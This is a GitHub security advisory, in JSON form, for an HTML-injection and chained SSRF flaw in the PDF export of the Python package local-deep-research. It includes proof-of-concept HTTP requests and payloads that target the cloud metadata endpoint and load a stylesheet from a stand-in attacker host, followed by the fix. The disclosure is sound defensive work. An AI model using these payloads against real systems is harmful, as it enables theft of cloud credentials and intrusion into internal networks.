@@ -1,0 +1,195 @@
+{
+  "id": "GHSA-fj2m-qvh9-jq4q",
+  "modified": "2026-05-11T19:50:51.473267Z",
+  "published": "2026-05-11T19:40:07Z",
+  "aliases": [
+    "CVE-2026-43979"
+  ],
+  "summary": "local-deep-research is Vulnerable to HTML Injection via Unescaped User Input in PDF Export (`pdf_service.py:_markdown_to_html`)",
+  "details": "## Summary\n\n`PDFService._markdown_to_html()` constructs an HTML document by interpolating user-controlled values — specifically `title` (sourced from `research.title` or `research.query`) and `metadata` key-value pairs — directly into an f-string without any HTML escaping. An authenticated attacker can craft a research query containing HTML special characters to inject arbitrary HTML tags into the document processed by WeasyPrint during PDF export. This injection can be chained to trigger a Server-Side Request Forgery (SSRF), bypassing the application's existing SSRF defenses in `ssrf_validator.py`.\n\n---\n\n## Details\n\n**Vulnerable code:** `src/local_deep_research/web/services/pdf_service.py`, lines 171–176\n\n```python\n# pdf_service.py:171-176\nif title:\n    html_parts.append(f\"\u003ctitle\u003e{title}\u003c/title\u003e\")   # ← title is not escaped\n\nif metadata:\n    for key, value in metadata.items():\n        html_parts.append(f'\u003cmeta name=\"{key}\" content=\"{value}\"\u003e')  # ← key/value are not escaped\n```\n\n**Data flow trace:**\n\n```\nUser input: research.query\n        │\n        ▼\nresearch_routes.py:1321\n  pdf_title = research.title or research.query\n        │\n        ▼\nresearch_routes.py:1325-1326\n  export_report_to_memory(report_content, format, title=pdf_title)\n        │\n        ▼\npdf_service.py:107\n  PDFService.markdown_to_pdf(markdown_content, title=pdf_title)\n        │\n        ▼\npdf_service.py:137\n  _markdown_to_html(markdown_content, title, metadata)\n        │\n        ▼\npdf_service.py:172\n  f\"\u003ctitle\u003e{title}\u003c/title\u003e\"   ← injection point, no escaping\n        │\n        ▼\npdf_service.py:112\n  HTML(string=html_content)   ← WeasyPrint renders the injected HTML\n```\n\n`research.query` is a string submitted by the user via `POST /api/start_research`, stored as-is in the database, and retrieved without any sanitization. When the user triggers `POST /api/v1/research/\u003cresearch_id\u003e/export/pdf`, this value is embedded unescaped into the HTML document processed by WeasyPrint.\n\n**Injection point 1: `\u003ctitle\u003e` tag breakout**\n\n```\nInput:    \u003c/title\u003e\u003cimg src=\"http://169.254.169.254/latest/meta-data/\" /\u003e\nRendered: \u003ctitle\u003e\u003c/title\u003e\u003cimg src=\"http://169.254.169.254/latest/meta-data/\" /\u003e\u003c/title\u003e\n```\n\nWhen WeasyPrint encounters the injected `\u003cimg\u003e` tag, it issues an HTTP GET request to the value of `src` by default.\n\n**Injection point 2: `\u003cmeta\u003e` attribute breakout**\n\n```\nInput:    \" /\u003e\u003clink rel=\"stylesheet\" href=\"http://attacker.com/evil.css\nRendered: \u003cmeta name=\"...\" content=\"\" /\u003e\u003clink rel=\"stylesheet\" href=\"http://attacker.com/evil.css\"\u003e\n```\n\nWeasyPrint will fetch and apply the external stylesheet, which also constitutes SSRF.\n\n---\n\n## Proof of Concept\n\n**Step 1: Log in and submit a research query containing the injection payload**\n\n```http\nPOST /api/start_research HTTP/1.1\nHost: localhost:5000\nContent-Type: application/json\nCookie: session=\u003cvalid_session\u003e\n\n{\n  \"query\": \"\u003c/title\u003e\u003cimg src=\\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\\\" onerror=\\\"x\\\"/\u003e\",\n  \"mode\": \"quick\",\n  \"model_provider\": \"OLLAMA\",\n  \"model\": \"llama3\"\n}\n```\n\nThe response returns a `research_id`, e.g. `\"aaaa-bbbb-cccc-dddd\"`.\n\n**Step 2: After the research completes, trigger PDF export**\n\n```http\nPOST /api/v1/research/aaaa-bbbb-cccc-dddd/export/pdf HTTP/1.1\nHost: localhost:5000\nCookie: session=\u003cvalid_session\u003e\nX-CSRFToken: \u003ccsrf_token\u003e\n```\n\n**Step 3: Intermediate HTML constructed server-side**\n\n```html\n\u003c!DOCTYPE html\u003e\u003chtml\u003e\u003chead\u003e\n\u003cmeta charset=\"utf-8\"\u003e\n\u003ctitle\u003e\u003c/title\u003e\u003cimg src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" onerror=\"x\"/\u003e\u003c/title\u003e\n\u003c/head\u003e\u003cbody\u003e\n...report content...\n\u003c/body\u003e\u003c/html\u003e\n```\n\n**Step 4: WeasyPrint issues an outbound HTTP request to the injected URL**\n\nObserved in network monitoring (e.g. `tcpdump`) or the target internal service logs:\n\n```\nGET /latest/meta-data/iam/security-credentials/ HTTP/1.1\nHost: 169.254.169.254\nUser-Agent: WeasyPrint/...\n```\n\n**Lightweight verification (no SSRF environment required):**\n\nSet the query to:\n\n```\n\u003c/title\u003e\u003ctitle\u003eINJECTED\n```\n\nThe resulting HTML will contain two `\u003ctitle\u003e` tags and the PDF document metadata title will read `INJECTED`, confirming successful injection.\n\n---\n\n## Impact\n\n### 1. Chained SSRF (High Severity)\n\nBy injecting `\u003cimg src\u003e`, `\u003clink href\u003e`, or `\u003cstyle\u003e@import url()` tags pointing to internal addresses, WeasyPrint will issue HTTP requests on behalf of the server during PDF generation. This allows access to:\n\n- **Cloud metadata services** (`169.254.169.254`) on AWS, GCP, or Azure — enabling theft of IAM credentials and instance identity documents.\n- **Internal network services** (`192.168.x.x`, `10.x.x.x`) — enabling reconnaissance and interaction with internal APIs not exposed to the internet.\n- **Localhost administrative interfaces** — if SSRF protections are only applied at the user-input validation layer.\n\nThis is an effective bypass of the application's existing SSRF defenses in `ssrf_validator.py`, because WeasyPrint's outbound resource requests are never routed through that validator.\n\n### 2. HTML Document Structure Corruption\n\nInjected tags can prematurely close `\u003chead\u003e` and insert arbitrary content into `\u003cbody\u003e`, causing WeasyPrint to render incorrectly or crash, resulting in a Denial of Service (DoS) condition for the export functionality.\n\n### 3. CSS Injection (Medium Severity)\n\nBy injecting `\u003clink\u003e` or `\u003cstyle\u003e` tags that load external stylesheets, an attacker can fully control the visual content of the generated PDF, enabling report content forgery or spoofing.\n\n### 4. Affected Scope\n\n- All PDF export operations are affected.\n- The vulnerability is reachable by any authenticated user — no elevated privileges required.\n- Because each user operates against their own encrypted database, cross-user exploitation is not possible. However, on any shared or multi-tenant deployment, every authenticated user can independently trigger this vulnerability.\n---\n\n## Remediation\n\nApply `html.escape()` to all user-controlled values before embedding them in the HTML template inside `_markdown_to_html`:\n\n```python\nimport html\n\nif title:\n    html_parts.append(f\"\u003ctitle\u003e{html.escape(title)}\u003c/title\u003e\")\n\nif metadata:\n    for key, value in metadata.items():\n        html_parts.append(\n            f'\u003cmeta name=\"{html.escape(str(key))}\" content=\"{html.escape(str(value))}\"\u003e'\n        )\n```\n\nAdditionally, consider configuring WeasyPrint with a custom `url_fetcher` that blocks or restricts outbound HTTP requests to prevent SSRF via injected or legitimately-embedded external resources:\n\n```python\ndef safe_url_fetcher(url, timeout=10):\n    from ssrf_validator import validate_url\n    if not validate_url(url):\n        raise ValueError(f\"Blocked unsafe URL in PDF rendering: {url}\")\n    return weasyprint.default_url_fetcher(url, timeout=timeout)\n\nhtml_doc = HTML(string=html_content, url_fetcher=safe_url_fetcher)\n```\n---\n\n*Report generated against commit `f3540fb3` — local-deep-research, branch `main`.*\n\n\n---\n\n## Maintainer note (2026-04-24)\n\nThanks @Firebasky for the detailed report. The complete remediation spans two PRs, both merged to `main`:\n\n**#3082** (merged 2026-03-29, shipped in **v1.5.0+**) — closes the HTML-injection sinks:\n- `html.escape()` now wraps the `title` value in `\u003ctitle\u003e…\u003c/title\u003e`\n- Same for metadata keys/values in `\u003cmeta name=\"…\" content=\"…\"\u003e`\n- Regression tests added in `tests/web/services/test_pdf_service.py`\n\n**#3613** (merged 2026-04-24, shipped in **v1.6.0**) — implements the `url_fetcher` recommendation from the Remediation section:\n- New `_safe_url_fetcher` in `pdf_service.py` delegates to `weasyprint.default_url_fetcher` only after `security.ssrf_validator.validate_url` accepts the URL\n- Blocks AWS metadata (169.254.169.254), RFC1918, loopback, and non-http(s) schemes\n- Covers the chained SSRF path through any URL reaching the rendered HTML — markdown body, citations, raw-HTML passthrough via Python-Markdown\n- Blocked URLs raise `UnsafePDFResourceURLError` (a `ValueError` subclass) so WeasyPrint skips the resource and the render continues\n- 8 regression tests, including an end-to-end render with `\u003cimg src=\"http://169.254.169.254/…\"\u003e` embedded in the body\n\n**Advisory metadata:** CVSS `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N` (5.0 Moderate), CWEs **CWE-79** + **CWE-918**. **Patched in v1.6.0** — upgrade to v1.6.0 or later to receive both fixes.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "local-deep-research",
+        "purl": "pkg:pypi/local-deep-research"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.6.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.0",
+        "0.1.1",
+        "0.1.12",
+        "0.1.13",
+        "0.1.14",
+        "0.1.15",
+        "0.1.16",
+        "0.1.17",
+        "0.1.18",
+        "0.1.19",
+        "0.1.20",
+        "0.1.21",
+        "0.1.22",
+        "0.1.23",
+        "0.1.24",
+        "0.1.25",
+        "0.1.26",
+        "0.2.0",
+        "0.2.2",
+        "0.2.3",
+        "0.3.0",
+        "0.3.1",
+        "0.3.10",
+        "0.3.11",
+        "0.3.12",
+        "0.3.2",
+        "0.3.3",
+        "0.3.5",
+        "0.3.6",
+        "0.3.8",
+        "0.3.9",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.4.3",
+        "0.4.4",
+        "0.5.0",
+        "0.5.2",
+        "0.5.3",
+        "0.5.4",
+        "0.5.5",
+        "0.5.6",
+        "0.5.7",
+        "0.5.9",
+        "0.6.0",
+        "0.6.1",
+        "0.6.4",
+        "0.6.5",
+        "0.6.7",
+        "1.0.0",
+        "1.0.1",
+        "1.1.1",
+        "1.1.10",
+        "1.1.11",
+        "1.1.6",
+        "1.1.7",
+        "1.1.8",
+        "1.1.9",
+        "1.2.0",
+        "1.2.1",
+        "1.2.10",
+        "1.2.11",
+        "1.2.12",
+        "1.2.13",
+        "1.2.14",
+        "1.2.15",
+        "1.2.16",
+        "1.2.17",
+        "1.2.2",
+        "1.2.24",
+        "1.2.25",
+        "1.2.26",
+        "1.2.27",
+        "1.2.28",
+        "1.2.3",
+        "1.2.4",
+        "1.2.5",
+        "1.2.6",
+        "1.2.7",
+        "1.2.8",
+        "1.2.9",
+        "1.3.0",
+        "1.3.1",
+        "1.3.10",
+        "1.3.11",
+        "1.3.12",
+        "1.3.13",
+        "1.3.14",
+        "1.3.15",
+        "1.3.16",
+        "1.3.17",
+        "1.3.18",
+        "1.3.19",
+        "1.3.20",
+        "1.3.21",
+        "1.3.22",
+        "1.3.24",
+        "1.3.25",
+        "1.3.26",
+        "1.3.28",
+        "1.3.29",
+        "1.3.30",
+        "1.3.40",
+        "1.3.41",
+        "1.3.42",
+        "1.3.43",
+        "1.3.44",
+        "1.3.45",
+        "1.3.46",
+        "1.3.47",
+        "1.3.48",
+        "1.3.49",
+        "1.3.50",
+        "1.3.51",
+        "1.3.52",
+        "1.3.53",
+        "1.3.54",
+        "1.3.55",
+        "1.3.56",
+        "1.3.57",
+        "1.3.58",
+        "1.3.59",
+        "1.3.6",
+        "1.3.60",
+        "1.3.7",
+        "1.3.8",
+        "1.3.9",
+        "1.4.0",
+        "1.5.0",
+        "1.5.3",
+        "1.5.5",
+        "1.5.6"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-fj2m-qvh9-jq4q/GHSA-fj2m-qvh9-jq4q.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/LearningCircuit/local-deep-research/security/advisories/GHSA-fj2m-qvh9-jq4q"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/LearningCircuit/local-deep-research/pull/3082"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/LearningCircuit/local-deep-research/pull/3613"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/LearningCircuit/local-deep-research/commit/0148fa265a3da460c07def7441f9ac49ea61fbcb"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/LearningCircuit/local-deep-research/commit/15f13d5c79847f1c38c2dc67bd0027c38af9e34b"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/LearningCircuit/local-deep-research"
+    }
+  ]
+}
